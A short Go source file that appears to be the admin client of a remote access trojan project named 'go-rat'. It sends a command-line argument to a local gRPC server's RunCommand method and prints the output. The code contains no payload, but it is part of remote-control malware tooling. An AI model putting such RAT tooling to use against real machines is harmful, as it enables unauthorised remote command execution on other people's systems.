package client

import (
	"context"
	"fmt"
	"github.com/iortego42/go-rat/grpcapi"
	"google.golang.org/grpc"
	"log"
	"os"
)

func main() {
	var (
		opts         []grpc.DialOption
		conn         *grpc.ClientConn
		admin_client grpcapi.AdminClient
		err          error
	)
	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	admin_client = grpcapi.NewAdminClient(conn)
	ctx := context.Background()
	var cmd = new(grpcapi.Command)
	cmd.In = os.Args[1]
	cmd, err = admin_client.RunCommand(ctx, cmd)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(cmd.Out)
}
